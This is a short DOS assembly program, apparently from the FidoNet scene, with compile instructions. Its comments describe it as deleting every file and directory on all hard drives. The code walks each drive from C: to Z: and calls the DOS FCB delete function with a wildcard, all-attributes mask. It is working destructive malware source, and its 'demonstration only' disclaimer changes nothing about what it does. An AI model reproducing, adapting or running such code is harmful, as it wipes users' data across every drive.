; phuckfcb (x) by Psychomancer,SPS \ 2:454/5.9@fidonet

; delete all philez&dirz on all drivez (exept floppiez :)

; 4 DEMONSTRATION ONLY! DON'T RUN IT!

; 4 compile it: tasm /m phuckfcb
;		tlink /t phuckmcb

model tiny
jumps
locals
codeseg
startupcode


		lea	di,cur_dir
		mov	ah,3bh
		mov	dx,di
		int	21h		;set current dir
		mov	ah,13h
		mov	dl,off_def_fcb
		int	21h		;delete all philez&dirz on current drv
		mov	al,[di]
		inc	ax
		stosb
		sub	al,'a'-1        ;calculate drv number 4 fcb access
		mov	drv_num,al
		cmp	al,'z'-'a'+2    ;was last drv (z)?
		jne	@startup
		retn


cur_dir 	db	'c:\',0         ;current dir 4 diz drv
off_def_fcb	=	$-@startup
FCB:		db	-1		;ext fcb
		db	5 dup (?)	;reserved
		db	-1		;set all attributez
drv_num 	db	3		;disk number (0==current,3==c)
		db	'???????????'   ;all philez
		db	19h dup (?)	;reserved

		end
